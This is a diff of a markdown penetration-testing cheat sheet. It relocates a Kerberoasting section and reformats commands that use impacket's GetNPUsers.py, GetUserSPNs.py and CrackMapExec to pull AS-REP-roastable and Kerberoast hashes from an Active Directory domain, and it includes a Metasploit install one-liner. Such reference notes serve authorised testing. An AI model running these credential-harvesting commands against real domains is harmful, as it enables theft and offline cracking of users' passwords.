@@ -94,11 +94,6 @@ Convert xml output to html files
 curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod 755 msfinstall && ./msfinstall
 ````
 
-## Kerberoasting
-```
-python GetUserSPNs.py -debug -request -outputfile kerberoasting.txt -dc-ip 1.1.1.1 -target-domain domain.local domain/user:password
-```
-
 ## Shodan
 ### Useful Searches
 ```
@@ -132,12 +127,25 @@ https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py
 
 users list dynamically queried with an LDAP anonymous bind
 
-```GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt -dc-ip $KeyDistributionCenter 'DOMAIN/'``` 
+```
+GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt -dc-ip $KeyDistributionCenter 'DOMAIN/'
+``` 
 
 users list dynamically queried with a LDAP authenticated bind (password)
 
-```GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt -dc-ip $KeyDistributionCenter 'DOMAIN/USER:Password'``` 
+```
+GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt -dc-ip $KeyDistributionCenter 'DOMAIN/USER:Password'
+``` 
 
 CrackMapExec
 
-```crackmapexec ldap $TARGETS -u $USER -p $PASSWORD --asreproast ASREProastables.txt --KdcHost $KeyDistributionCenter``` 
+```
+crackmapexec ldap $TARGETS -u $USER -p $PASSWORD --asreproast ASREProastables.txt --KdcHost $KeyDistributionCenter
+``` 
+
+## Kerberoasting
+https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py
+
+```
+python GetUserSPNs.py -debug -request -outputfile kerberoasting.txt -dc-ip 1.1.1.1 -target-domain domain.local domain/user:password
+```
